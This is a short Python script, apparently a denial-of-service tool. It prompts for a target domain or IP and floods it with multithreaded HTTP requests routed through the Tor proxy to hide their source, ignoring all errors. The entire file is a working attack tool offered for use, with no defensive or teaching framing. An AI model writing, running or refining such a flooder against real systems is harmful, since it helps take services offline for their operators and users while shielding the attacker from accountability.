import threading
import requests

# Function to run in each thread
def flood_ip(ip_address, num_requests):
  for i in range(num_requests):
    try:
      # Use the Tor network to send a request to the IP address
      session = requests.Session()
      session.proxies = {"http": "socks5://127.0.0.1:9050", "https": "socks5://127.0.0.1:9050"}
      session.get("http://" + ip_address)
    except:
      # If the request fails, do nothing
      pass

# Get the IP address to flood from the user
ip_address = input("Enter a domain or IP address to flood: ")

# Get the number of threads and requests from the user
num_threads = int(input("Enter the number of threads to use: "))
num_requests = int(input("Enter the number of requests to send in each thread: "))

# Create and start the threads
threads = []
for i in range(num_threads):
  t = threading.Thread(target=flood_ip, args=(ip_address, num_requests))
  threads.append(t)
  t.start()

# Wait for all threads to finish
for t in threads:
  t.join()
